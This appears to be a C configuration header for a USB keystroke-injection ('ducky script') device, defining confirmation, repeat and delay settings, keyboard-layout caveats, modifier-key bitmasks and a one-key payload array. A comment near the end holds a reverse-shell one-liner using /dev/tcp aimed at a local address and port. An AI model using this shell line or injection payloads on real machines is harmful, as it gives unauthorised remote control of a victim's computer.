// In this file you configure your Payload
// In Main Payload you write each line of your exploit
//########## CONFIG ##############
// if 0 then script will immediately execute.
// Otherwise the board button has to be pressed
#include <stdint.h>
const uint8_t BOARD_BUTTON_CONFIRMATION_NEEDED = 1;
// IMPORTANT PUT THE LINE, COUNT OF YOUR PAYLOAD HERE
#define MAIN_PAYLOAD_LEN_DEF 1
// if 0 Script runs once, else it repeatedly executes it
const uint8_t REPEAT_DUCKY_SCRIPT = 0;
// Set this according to the PC that it will be attached to
// a sensible default delay would be 100ms
const uint16_t KEYPRESS_DELAY_MS = 100;
//######## CONFIG ##################
const int MAIN_PAYLOAD_LEN=MAIN_PAYLOAD_LEN_DEF;
/*
The HID_KEYs as they are defined in tinyusb are for the US Layout
IF the PC doesnt use US Layout, then you will have to lookup us layout and convert the keys
For example on German Keyboard layout "EQ" in your Payload will lead to the Gravure Key being pressed instead of =
For Most Layouts finding the correct values to use can be easy or NOT
But the most common layouts should work without issues

const char* MAIN_PAYLOAD[]={
};

*/
// TODO: TEST the modifier Defines
#define L_CTRL   0b0000000100000000
#define L_SHIFT  0b0000001000000000
#define L_ALT    0b0000010000000000
#define L_GUI    0b0000100000000000
#define R_CTRL   0b0001000000000000
#define R_SHIFT  0b0010000000000000
#define R_ALT    0b0100000000000000
#define R_GUI    0b1000000000000000
// Special Key < on German Keyboards and other european ones for should be:
// #define HID_KEY_EUROPE_2 0x64
// sh -i >& /dev/tcp/127.0.0.1/9000 0>&1

const uint16_t MAIN_PAYLOAD[]={
0x1C
};
